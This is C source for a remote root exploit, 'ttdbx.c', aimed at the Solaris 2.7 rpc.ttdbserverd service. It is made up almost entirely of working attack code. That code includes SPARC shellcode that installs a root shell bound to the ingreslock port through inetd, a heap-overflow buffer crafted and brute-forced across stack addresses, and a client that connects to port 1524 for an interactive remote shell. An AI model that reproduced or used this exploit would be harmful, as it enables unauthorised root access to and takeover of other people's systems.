/*
 * ttdbx.c - solaris 2.7 rpc.ttdbserverd remote root exploit
 * written by bind <bind@insidiae.org>
 * september 3rd, 2002
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE, DO NOT DISTRIBUTE
 */

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <rpc/rpc.h>

#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "ttdb.h"

#define _zero(x) memset(&(x), 0, sizeof(x));
#define _death(a) do{ perror(#a "()"); exit(-1); }while(0)

#define CMD "echo \"ingreslock stream tcp nowait root /bin/sh sh -i\"" \
            ">/tmp/x;/usr/sbin/inetd -s /tmp/x;rm /tmp/x;\n";

char cmdshellcode[] =
"\x20\xbf\xff\xff"		/* bn,a    <cmdshellcode-4>     */
"\x20\xbf\xff\xff"		/* bn,a    <cmdshellcode>       */
"\x7f\xff\xff\xff"		/* call    <cmdshellcode+4>     */
"\x90\x03\xe0\x34"		/* add     %o7,52,%o0           */
"\x92\x23\xe0\x20"		/* sub     %o7,32,%o1           */
"\xa2\x02\x20\x0c"		/* add     %o0,12,%l1           */
"\xa4\x02\x20\x10"		/* add     %o0,16,%l2           */
"\xc0\x2a\x20\x08"		/* stb     %g0,[%o0+8]          */
"\xc0\x2a\x20\x0e"		/* stb     %g0,[%o0+14]         */
"\xd0\x23\xff\xe0"		/* st      %o0,[%o7-32]         */
"\xe2\x23\xff\xe4"		/* st      %l1,[%o7-28]         */
"\xe4\x23\xff\xe8"		/* st      %l2,[%o7-24]         */
"\xc0\x23\xff\xec"		/* st      %g0,[%o7-20]         */
"\x82\x10\x20\x0b"		/* mov     0xb,%g1              */
"\x91\xd0\x20\x08"		/* ta      8                    */
"/bin/ksh    -c  "
CMD;

char	*craft_buffer(u_long);
int	populate(char *, int);
int	send_file(char *, int, char *);
int	shell(char *host);
void	usage(char *p);
u_long	resolve(char *);

int
main(int argc, char **argv)
{
	char opt;
	char *p, *host, *buf;
	u_long baseaddr = 0xffbef6ec;
	int i, j, port = 0, distance = 58;

	p = argv[0];
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("ttdbx.c - solaris 2.7 rpc.ttdbserverd remote root exploit\n"
               "written by bind <bind@insidiae.org>\n");

	while((opt = getopt(argc, argv, "p:b:d:")) != EOF) {
		switch(opt) {
		case 'p':
			port = atoi(optarg);
			break;
		case 'b':
			baseaddr = strtoul(optarg, NULL, 0);
			break;
		case 'd':
			distance = atoi(optarg);
			break;
		default:	
			usage(p);
		}
	}

	argv += optind;
	host = argv[0];

	if (!host) 
		usage(p);

	putchar('\n');

	for (i = 0; i < distance; i++) {
		printf("using address: 0x%x\r", baseaddr);

		buf = craft_buffer(baseaddr);

		populate(host, port);
		send_file(host, port, buf);

		if (shell(host) > 0)
			break;

		baseaddr += 4;
	}

	putchar('\n');
	exit(0);
}

char *
craft_buffer(u_long o3)
{
	int i;
	char *buf;
	int len = 1500;
	u_long scaddr = 0x86ba0, jmpcode;

	jmpcode = (scaddr - o3) / 4 + 0x40000000;

	buf = (char *) malloc(len);

	memset(buf, 0x41, len);

	/* populate heap/stack with jmpcode */
	for (i = 0; i < 32; i += 4)
		*(long *) &buf[i] = htonl(jmpcode);

	/* nop it up */
	for (i = 32; i < 128; i += 4)
		*(long *) &buf[i] = htonl(0x82184001);

	/* copy in shellcode */
	memcpy(buf + 128, cmdshellcode, strlen(cmdshellcode));

	/* please t_delete */
	*(long *) &buf[1048 - 16] = htonl(0xfffffff0);
	*(long *) &buf[1048 - 8] = htonl(0xffbef250);

	*(long *) &buf[1048] = htonl(0xff91f880 - 8);

	/* o3 address */
	*(long *) &buf[1464] = htonl(o3);

	return (buf);
}

int
populate(char *host, int port)
{
	char buf[1024];

	memset(buf, 0x41, sizeof(buf));

	send_file(host, port, buf);

	return (0);
}

int
send_file(char *host, int port, char *buf)
{
	int sockfd;
	CLIENT *cl;
	enum clnt_stat stat;
	_tt_create_file_args create;
	struct sockaddr_in sin;
	struct timeval tm = {10, 0};

	sockfd = RPC_ANYSOCK;

	sin.sin_port = htons(port);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = resolve(host);

	if (!(cl = clnttcp_create(&sin, 100083, 1, &sockfd, 0, 0))) {
		clnt_pcreateerror("clnttcp_create");
		clnt_destroy(cl);
		close(sockfd);
		exit(-1);
	}
	cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);

	create.file = buf;
	create.properties.properties_len = 0;
	create.access.user = 0;
	create.access.group = 1;
	create.access.mode = 777;

	stat = clnt_call(cl, (u_long) 103, (xdrproc_t) xdr_tt_create_file_args,
			 (char *) &create, (xdrproc_t) xdr_void, NULL, tm);

	clnt_destroy(cl);
	close(sockfd);

	if (stat != RPC_SUCCESS) {
		//puts("something went wrong");
		return (-1);
	}
	return (0);
}

u_long 
resolve(char *hostname)
{
	struct sockaddr_in sin;
	struct hostent *hent;

	if (!(hent = gethostbyname(hostname)))
		return (0);

	bzero((char *) &sin, sizeof(sin));
	memcpy((char *) &sin.sin_addr, hent->h_addr, hent->h_length);

	return (sin.sin_addr.s_addr);
}

int
forward(int from, int to)
{
	char data[1024];
	int n, m;

	n = read(from, data, sizeof(data));
	if (!n)
		return (-1);
	if (n == -1)
		_death(read);
	m = write(to, data, n);
	if (m != n)
		_death(write);
	return (0);
}

int
shell(char *host)
{
	fd_set set;
	int n, sd;
	char data[1024];
	struct sockaddr_in sin;
	const char cmd[] = "/usr/bin/uname -a\n";

	if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		//perror("socket()");
		return (-1);
	}
	sin.sin_port = htons(1524);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = resolve(host);

	if (connect(sd, (struct sockaddr *) & sin, sizeof(sin)) < 0) {
		return (-1);
	}

	puts("\n");

	read(sd, data, sizeof(data));

	write(sd, cmd, strlen(cmd));

	_zero(data);

	read(sd, data, sizeof(data));
	printf("%s", data);

	for (;;) {
		FD_ZERO(&set);
		FD_SET(0, &set);
		FD_SET(sd, &set);

		n = select(sd + 1, &set, NULL, NULL, NULL);
		if (n == -1)
			_death(select);

		if (FD_ISSET(0, &set))
			if (forward(0, sd))
				break;

		if (FD_ISSET(sd, &set))
			if (forward(sd, 1))
				break;
	}
	return (1);
}

void
usage(char *p)
{
	printf("usage: %s [-p <port>] [-b <baseaddr>] [-d <distance>] host\n"
	       "       -p\trpc.ttdbserverd port\n"
	       "       -b\tbase address for brute forcing\n"
               "       -d\tbrute force distance\n"
	       "       host\thost running vulnerable ttdbserver\n", p);
	exit(-1);
}
